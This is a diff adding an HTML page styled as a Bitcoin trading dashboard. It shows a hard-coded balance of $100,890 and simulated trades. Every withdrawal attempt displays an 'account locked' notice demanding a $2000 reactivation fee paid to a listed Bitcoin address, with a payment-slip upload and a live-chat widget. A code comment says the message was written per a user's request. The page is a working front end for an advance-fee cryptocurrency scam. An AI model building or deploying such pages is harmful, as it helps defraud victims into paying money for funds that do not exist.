@@ -1,0 +1,441 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>BTC Trading Dashboard — Withdraw </title>
+
+  <!-- Chart.js CDN -->
+  <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
+
+  <style>
+    :root{
+      --bg:#071122;
+      --card: rgba(255,255,255,0.03);
+      --muted:#98a0b3;
+      --accent:#00c48c;
+      --danger:#ff6b6b;
+      --glass: rgba(255,255,255,0.02);
+      font-family: Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, Arial;
+    }
+    *{box-sizing:border-box}
+    body{
+      margin:0;
+      background: linear-gradient(180deg,#071122 0%, #071b2a 100%);
+      color:#e8f0ff;
+      min-height:100vh;
+      padding:28px;
+    }
+    .wrap{
+      max-width:1100px;
+      margin:0 auto;
+      display:grid;
+      grid-template-columns: 1fr 360px;
+      gap:20px;
+    }
+    header{ grid-column:1/-1; display:flex; justify-content:space-between; align-items:center; gap:12px; }
+    h1{font-size:20px;margin:0}
+    .sub{color:var(--muted);font-size:13px}
+    .card{
+      background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(0,0,0,0.02));
+      border-radius:12px;
+      padding:18px;
+      box-shadow: 0 6px 20px rgba(2,6,23,0.6);
+      border: 1px solid rgba(255,255,255,0.03);
+    }
+
+    /* layout pieces */
+    .price { font-size:28px; font-weight:700; }
+    .change { font-size:14px; color:var(--muted); }
+    .change.positive { color:var(--accent); }
+    .change.negative { color:var(--danger); }
+
+    .chart-wrap{ margin-top:12px; height:320px; border-radius:10px; padding:10px; background:var(--glass); }
+
+    .controls{ display:flex; gap:10px; margin-top:10px; }
+    .btn{
+      padding:10px 12px; border-radius:8px; cursor:pointer; border:0; font-weight:700;
+      background: linear-gradient(90deg,#0f1724,#111827); color:#dfe7ff;
+    }
+    .btn.primary{ background: linear-gradient(90deg,#05c07f,#00a86b); color:#062015; }
+    .btn.warn{ background: linear-gradient(90deg,#ff6b6b,#ff3b3b); color:white; }
+
+    .switch-row{ display:flex; align-items:center; gap:10px; }
+    .muted{ color:var(--muted); font-size:13px; }
+
+    /* modal */
+    .modal-backdrop{
+      position:fixed; inset:0; background:rgba(2,6,23,0.6); display:flex; align-items:center; justify-content:center;
+      z-index:1200; visibility:hidden; opacity:0; transition: opacity .18s ease, visibility .18s;
+    }
+    .modal-backdrop.show{ visibility:visible; opacity:1; }
+    .modal{
+      background:linear-gradient(180deg,#0b1220,#07101a); border-radius:12px; padding:20px; width:420px; max-width:94%;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.6); border:1px solid rgba(255,255,255,0.03);
+    }
+    .modal h3{ margin:0 0 8px 0; font-size:18px; }
+    .modal p{ margin:0 0 14px 0; color:var(--muted); }
+    .modal .actions{ display:flex; gap:10px; justify-content:flex-end; margin-top:12px; }
+
+    /* responsive */
+    @media (max-width:980px){ .wrap{ grid-template-columns: 1fr; } .modal{ width:94%; } }
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <header>
+      <div>
+        <h1>Bitcoin Trading Dashboard </h1>
+        <div class="sub">account • Balance: <b>$100,890.00</b></div>
+      </div>
+
+      <div style="display:flex;align-items:center;gap:12px;">
+        <div class="switch-row">
+          <label class="muted" for="simToggle">demo mode</label>
+          <input type="checkbox" id="simToggle" />
+        </div>
+      </div>
+    </header>
+
+    <!-- LEFT: Main -->
+    <main class="card">
+      <div style="display:flex;justify-content:space-between;align-items:flex-start;">
+        <div>
+          <div style="font-size:12px;color:var(--muted)">BTC / USD</div>
+          <div class="price" id="price">$0.00</div>
+          <div id="change" class="change">+0.00%</div>
+        </div>
+
+        <div style="text-align:right;">
+          <div class="muted" style="font-size:12px;">24h High</div>
+          <div id="high24">$0.00</div>
+          <div class="muted" style="font-size:12px;margin-top:8px;">24h Low</div>
+          <div id="low24">$0.00</div>
+        </div>
+      </div>
+
+      <div class="chart-wrap">
+        <canvas id="priceChart"></canvas>
+      </div>
+
+      <div style="display:flex;gap:12px;margin-top:12px;align-items:center;">
+        <div class="card" style="padding:12px;">
+          <div class="muted" style="font-size:13px;">Portfolio</div>
+          <div style="display:flex;gap:18px;margin-top:8px;">
+            <div>
+              <div class="muted" style="font-size:12px;">USD Cash</div>
+              <div id="usdCash" style="font-weight:700;">$100,890.00</div>
+            </div>
+            <div>
+              <div class="muted" style="font-size:12px;">BTC Holdings</div>
+              <div id="btcHoldings" style="font-weight:700;">0.000000 BTC</div>
+            </div>
+            <div>
+              <div class="muted" style="font-size:12px;">Total Equity</div>
+              <div id="totalEquity" style="font-weight:700;">$100,890.00</div>
+            </div>
+          </div>
+        </div>
+
+        <div style="margin-left:auto; display:flex; flex-direction:column; gap:8px;">
+          <div style="display:flex;gap:8px;">
+            <button class="btn primary" id="quickBuy">Buy $100</button>
+            <button class="btn" id="quickSell">Sell 0.001 BTC</button>
+          </div>
+          <div style="display:flex;gap:8px;">
+            <button class="btn" id="withdrawBtn">Withdraw</button>
+            <button class="btn" d="resetBtn" style="background:var(--glass); color:var(--muted);">add withdrawal wallet</button>
+          </div>
+        </div>
+      </div>
+    </main>
+
+    <!-- RIGHT: Sidebar -->
+    <aside class="card">
+      <div class="muted" style="font-size:13px;">Account</div>
+      <div style="font-weight:700;font-size:20px;margin-top:6px;" id="balanceMain">$100,890.00</div>
+      <div class="muted" style="font-size:13px;margin-top:6px;">Status: <span id="acctStatus">Active</span></div>
+
+      <div style="margin-top:12px;">
+        <div class="muted" style="font-size:13px;">Reactivation wallet:</div>
+        <div style="color:var(--muted);font-size:13px;margin-top:8px;">
+          1FJiJUMhLu7DuCw8uGoQR2wUNP3g5mShnN
+
+    <input type="file" id="myFileInput" placeholder='upload payment slip' style="border: 1px solid #ccc; padding: 8px 12px; border-radius: 5px; background-color: #f0f0f0; color: #333; font-family: Arial, sans-serif;">
+</input>
+
+<button type="button" style="background-color: grey; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px;">
+    reactivate
+</button>
+
+        </div>
+      </div>
+    </aside>
+  </div>
+
+  <!-- Modal (withdraw message) -->
+  <div id="modalBackdrop" class="modal-backdrop" role="dialog" aria-modal="true" aria-hidden="true">
+    <div class="modal" role="document" aria-labelledby="modalTitle">
+      <h3 id="modalTitle">Withdrawal</h3>
+      <p id="modalMessage" style="font-weight:600; color:#fff; margin-bottom:8px;">
+        account locked! liquidate your locked asset and withdraw
+      </p>
+      <p class="muted">This is a message shown when the withdrawal flow is blocked. pay a reactivation fee of $2000(usd)to the wallet below or contact a professional fx trader.</p>
+      <div class="actions" style="display:flex;gap:8px;justify-content:flex-end;margin-top:12px;">
+        <button class="btn" id="modalClose">Close</button>
+      </div>
+    </div>
+  </div>
+
+<!--Start of Tawk.to Script-->
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/694fd4413169ac197f3fb57d/1jdfta8m1';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
+<!--End of Tawk.to Script-->
+
+  <script>
+    /***********************
+     * Helpers & formatters
+     ***********************/
+    const formatUSD = n => '$' + Number(n).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+    const formatBTC = n => Number(n).toFixed(6) + ' BTC';
+
+    /***********************
+     * Demo state (client-side only)
+     ***********************/
+    const state = {
+      usdCash: 100890.00,
+      btcHoldings: 0.0,
+      price: 58240.00,
+      history: [],
+      simMode: false,
+      high24: 58240.00,
+      low24: 58240.00,
+    };
+
+    // seed history
+    (function seed(){
+      let p = state.price;
+      for(let i=0;i<60;i++){
+        p = +(p * (1 + (Math.random()-0.5) * 0.002)).toFixed(2);
+        state.history.push(p);
+      }
+      state.price = state.history[state.history.length - 1];
+      state.high24 = Math.max(...state.history);
+      state.low24 = Math.min(...state.history);
+    })();
+
+    /***********************
+     * Chart.js
+     ***********************/
+    const ctx = document.getElementById('priceChart').getContext('2d');
+    const chart = new Chart(ctx, {
+      type: 'line',
+      data: {
+        labels: state.history.map((_,i)=>i),
+        datasets: [{
+          label: 'BTC / USD',
+          data: state.history,
+          borderColor: '#00e093',
+          tension: 0.15,
+          pointRadius: 0,
+          borderWidth: 2,
+          fill: { target: 'origin', above: 'rgba(0,196,140,0.06)' }
+        }]
+      },
+      options: {
+        plugins: { legend: { display: false } },
+        scales: {
+          x: { display: false },
+          y: { grid: { color: 'rgba(255,255,255,0.03)' }, ticks: { color: 'rgba(255,255,255,0.6)' } }
+        },
+        animation: { duration: 300 },
+        maintainAspectRatio: false,
+      }
+    });
+
+    /***********************
+     * DOM elements
+     ***********************/
+    const els = {
+      price: document.getElementById('price'),
+      change: document.getElementById('change'),
+      high24: document.getElementById('high24'),
+      low24: document.getElementById('low24'),
+      usdCash: document.getElementById('usdCash'),
+      btcHoldings: document.getElementById('btcHoldings'),
+      totalEquity: document.getElementById('totalEquity'),
+      balanceMain: document.getElementById('balanceMain'),
+      simToggle: document.getElementById('simToggle'),
+      quickBuy: document.getElementById('quickBuy'),
+      quickSell: document.getElementById('quickSell'),
+      withdrawBtn: document.getElementById('withdrawBtn'),
+      resetBtn: document.getElementById('resetBtn'),
+      acctStatus: document.getElementById('acctStatus'),
+      modalBackdrop: document.getElementById('modalBackdrop'),
+      modalClose: document.getElementById('modalClose'),
+    };
+
+    /***********************
+     * UI refresh
+     ***********************/
+    function refreshUI(changePct = 0){
+      els.price.textContent = formatUSD(state.price);
+      els.change.textContent = (changePct >= 0 ? '+' : '') + changePct.toFixed(2) + '%';
+      els.change.className = 'change ' + (changePct >= 0 ? 'positive' : 'negative');
+
+      els.high24.textContent = formatUSD(state.high24);
+      els.low24.textContent = formatUSD(state.low24);
+
+      els.usdCash.textContent = formatUSD(state.usdCash);
+      els.btcHoldings.textContent = formatBTC(state.btcHoldings);
+
+      const equity = +(state.usdCash + state.btcHoldings * state.price);
+      els.totalEquity.textContent = formatUSD(equity);
+      els.balanceMain.textContent = formatUSD(state.usdCash);
+
+      chart.data.datasets[0].data = state.history.slice();
+      chart.data.labels = state.history.map((_,i)=>i);
+      chart.update();
+    }
+
+    /***********************
+     * Live price fetch (CoinGecko)
+     ***********************/
+    async function fetchLivePrice(){
+      try {
+        const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd&include_24hr_change=true');
+        const json = await res.json();
+        if(json && json.bitcoin && typeof json.bitcoin.usd === 'number'){
+          const newP = +json.bitcoin.usd;
+          const change24 = +json.bitcoin.usd_24h_change;
+          state.price = newP;
+          state.history.push(newP);
+          if(state.history.length > 120) state.history.shift();
+          state.high24 = Math.max(state.high24, newP);
+          state.low24 = Math.min(state.low24, newP);
+          refreshUI(change24);
+        }
+      } catch (e) {
+        // silent fail (keep simulation)
+        console.error('Live fetch failed:', e);
+      }
+    }
+
+    /***********************
+     * Simulation tick
+     ***********************/
+    function tickSim(){
+      const vol = 0.002;
+      const drift = (Math.random() - 0.5) * vol;
+      const newP = +(state.price * (1 + drift)).toFixed(2);
+      state.price = newP;
+      state.history.push(newP);
+      if(state.history.length > 120) state.history.shift();
+      state.high24 = Math.max(state.high24, newP);
+      state.low24 = Math.min(state.low24, newP);
+      const change = ((newP - state.history[0]) / state.history[0]) * 100;
+      refreshUI(change);
+    }
+
+    /***********************
+     * Intervals
+     ***********************/
+    // Live fetch every 10s
+    const LIVE_INTERVAL_MS = 10000;
+    setInterval(() => {
+      if(!state.simMode) fetchLivePrice();
+    }, LIVE_INTERVAL_MS);
+
+    // Simulation tick every 1.5s when sim is enabled
+    const SIM_INTERVAL_MS = 1500;
+    setInterval(() => {
+      if(state.simMode) tickSim();
+    }, SIM_INTERVAL_MS);
+
+    /***********************
+     * Controls
+     ***********************/
+    // simulation toggle
+    els.simToggle.addEventListener('change', (e) => {
+      state.simMode = !!e.target.checked;
+      els.acctStatus.textContent = state.simMode ? 'Simulation' : 'Live';
+      // if switching to live, fetch immediately
+      if(!state.simMode) fetchLivePrice();
+    });
+
+    // quick buy (demo)
+    els.quickBuy.addEventListener('click', () => {
+      const usd = 100;
+      if(state.usdCash < usd){ alert('Not enough USD'); return; }
+      const btc = +(usd / state.price);
+      state.usdCash = +(state.usdCash - usd).toFixed(2);
+      state.btcHoldings = +(state.btcHoldings + btc).toFixed(6);
+      refreshUI();
+    });
+
+    // quick sell (demo)
+    els.quickSell.addEventListener('click', () => {
+      const btc = 0.001;
+      if(state.btcHoldings < btc){ alert('Not enough BTC'); return; }
+      const usd = +(btc * state.price);
+      state.btcHoldings = +(state.btcHoldings - btc).toFixed(6);
+      state.usdCash = +(state.usdCash + usd).toFixed(2);
+      refreshUI();
+    });
+
+    // withdraw button: show modal with the requested message
+    els.withdrawBtn.addEventListener('click', () => {
+      // show the modal; message per user's request
+      const msgEl = document.getElementById('modalMessage');
+      msgEl.textContent = 'account locked, liquidate your locked asset and withdraw';
+      els.modalBackdrop.classList.add('show');
+      els.modalBackdrop.setAttribute('aria-hidden', 'false');
+    });
+
+    // close modal
+    els.modalClose.addEventListener('click', () => {
+      els.modalBackdrop.classList.remove('show');
+      els.modalBackdrop.setAttribute('aria-hidden', 'true');
+    });
+
+    // reset demo
+    els.resetBtn.addEventListener('click', () => {
+      if(!confirm('Reset demo to initial state?')) return;
+      state.usdCash = 100890.00;
+      state.btcHoldings = 0.0;
+      state.history = [];
+      state.price = 58240 + Math.round((Math.random() - 0.5) * 1000);
+      let p = state.price;
+      for(let i=0;i<60;i++){ p = +(p * (1 + (Math.random()-0.5) * 0.002)).toFixed(2); state.history.push(p); }
+      state.high24 = Math.max(...state.history);
+      state.low24 = Math.min(...state.history);
+      state.simMode = false;
+      els.simToggle.checked = false;
+      els.acctStatus.textContent = 'Active';
+      refreshUI(0);
+    });
+
+    // close modal on backdrop click
+    document.getElementById('modalBackdrop').addEventListener('click', (ev) => {
+      if(ev.target === ev.currentTarget){
+        els.modalBackdrop.classList.remove('show');
+        els.modalBackdrop.setAttribute('aria-hidden', 'true');
+      }
+    });
+
+    // init UI
+    refreshUI(0);
+    // initial live fetch
+    fetchLivePrice();
+  </script>
+</body>
+</html>
